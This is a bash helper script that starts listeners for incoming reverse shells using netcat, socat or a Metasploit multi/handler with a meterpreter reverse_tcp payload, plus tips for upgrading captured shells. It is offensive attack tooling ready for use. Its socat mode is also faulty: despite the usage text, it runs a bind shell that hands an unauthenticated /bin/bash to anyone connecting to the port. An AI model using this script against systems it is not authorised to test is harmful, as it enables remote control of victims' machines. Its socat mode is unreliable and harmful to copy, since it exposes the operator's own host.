#!/bin/bash
# Listener Setup Helper
# Quick setup for various types of listeners

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_usage() {
    cat << EOF
Usage: $0 [OPTIONS]

Start various types of listeners for reverse shells

Options:
    -p, --port PORT         Port to listen on (default: 4444)
    -t, --type TYPE         Listener type: nc|socat|msfconsole (default: nc)
    -m, --msf-payload P     Metasploit payload (e.g., linux/x86/meterpreter/reverse_tcp)
    -l, --lhost IP          LHOST for Metasploit (autodetect if not specified)
    -r, --rlwrap            Use rlwrap for better shell (nc only)
    -v, --verbose           Verbose output
    -h, --help              Show this help

Examples:
    $0                                  # Basic netcat listener on port 4444
    $0 -p 9001 -r                       # Netcat with rlwrap on port 9001
    $0 -t socat -p 4444                 # Socat listener
    $0 -t msfconsole -m linux/x86/meterpreter/reverse_tcp

Listener Types:
    nc          - Netcat (traditional)
    socat       - Socat (more stable)
    msfconsole  - Metasploit multi/handler

EOF
}

PORT=4444
TYPE="nc"
MSF_PAYLOAD=""
LHOST=""
RLWRAP=false
VERBOSE=false

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -t|--type)
            TYPE="$2"
            shift 2
            ;;
        -m|--msf-payload)
            MSF_PAYLOAD="$2"
            shift 2
            ;;
        -l|--lhost)
            LHOST="$2"
            shift 2
            ;;
        -r|--rlwrap)
            RLWRAP=true
            shift
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -h|--help)
            print_usage
            exit 0
            ;;
        *)
            echo -e "${RED}Unknown option: $1${NC}"
            print_usage
            exit 1
            ;;
    esac
done

# Auto-detect LHOST if not provided
if [ -z "$LHOST" ]; then
    LHOST=$(ip -4 addr show | grep inet | grep -v 127.0.0.1 | head -1 | awk '{print $2}' | cut -d/ -f1)
fi

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}   Listener Setup Helper${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""
echo -e "${GREEN}Configuration:${NC}"
echo -e "  Port: $PORT"
echo -e "  Type: $TYPE"
[ -n "$LHOST" ] && echo -e "  LHOST: $LHOST"
[ -n "$MSF_PAYLOAD" ] && echo -e "  Payload: $MSF_PAYLOAD"
echo ""

case $TYPE in
    nc|netcat)
        if [ "$RLWRAP" = true ]; then
            if command -v rlwrap &> /dev/null; then
                echo -e "${GREEN}Starting rlwrap netcat listener on port $PORT${NC}"
                echo -e "${YELLOW}Tip: Use Ctrl+Z, then 'stty raw -echo; fg' for better shell${NC}"
                echo ""
                rlwrap nc -lvnp $PORT
            else
                echo -e "${YELLOW}rlwrap not found, using regular netcat${NC}"
                echo -e "${YELLOW}Install with: sudo apt install rlwrap${NC}"
                nc -lvnp $PORT
            fi
        else
            echo -e "${GREEN}Starting netcat listener on port $PORT${NC}"
            echo -e "${YELLOW}Tip: Use 'rlwrap nc -lvnp $PORT' for better shell${NC}"
            echo ""
            nc -lvnp $PORT
        fi
        ;;
    
    socat)
        if command -v socat &> /dev/null; then
            echo -e "${GREEN}Starting socat listener on port $PORT${NC}"
            echo -e "${YELLOW}Provides PTY by default for better shell${NC}"
            echo ""
            # Check for available shells
            if [ -x "/bin/bash" ]; then
                SHELL_CMD="/bin/bash"
            elif [ -x "/bin/sh" ]; then
                SHELL_CMD="/bin/sh"
            else
                echo -e "${RED}No suitable shell found${NC}"
                exit 1
            fi
            socat TCP-LISTEN:$PORT,reuseaddr,fork EXEC:$SHELL_CMD,pty,stderr,setsid,sigint,sane
        else
            echo -e "${RED}socat not found${NC}"
            echo -e "${YELLOW}Install with: sudo apt install socat${NC}"
            exit 1
        fi
        ;;
    
    msfconsole|msf)
        if command -v msfconsole &> /dev/null; then
            if [ -z "$MSF_PAYLOAD" ]; then
                echo -e "${YELLOW}No payload specified, using default: linux/x86/meterpreter/reverse_tcp${NC}"
                MSF_PAYLOAD="linux/x86/meterpreter/reverse_tcp"
            fi
            
            echo -e "${GREEN}Starting Metasploit listener${NC}"
            echo -e "  Payload: $MSF_PAYLOAD"
            echo -e "  LHOST: $LHOST"
            echo -e "  LPORT: $PORT"
            echo ""
            
            msfconsole -q -x "use exploit/multi/handler; set payload $MSF_PAYLOAD; set LHOST $LHOST; set LPORT $PORT; exploit"
        else
            echo -e "${RED}msfconsole not found${NC}"
            echo -e "${YELLOW}Install Metasploit Framework${NC}"
            exit 1
        fi
        ;;
    
    *)
        echo -e "${RED}Unknown listener type: $TYPE${NC}"
        echo "Supported types: nc, socat, msfconsole"
        exit 1
        ;;
esac
